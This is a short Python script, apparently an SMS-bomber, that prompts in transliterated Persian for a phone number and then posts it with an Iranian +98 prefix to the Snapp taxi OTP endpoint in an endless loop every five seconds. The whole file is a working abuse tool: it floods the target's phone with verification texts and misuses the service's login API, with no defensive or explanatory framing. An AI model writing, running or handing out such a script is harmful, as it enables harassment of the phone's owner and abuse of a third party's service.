import requests
import time 
phonum = input("shomare ra vard kon")

urlsend = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
md = {"cellphone":"+98"+phonum}

while True :
	requests.post(urlsend,data=md)
	print("sendid")
	time.sleep(5)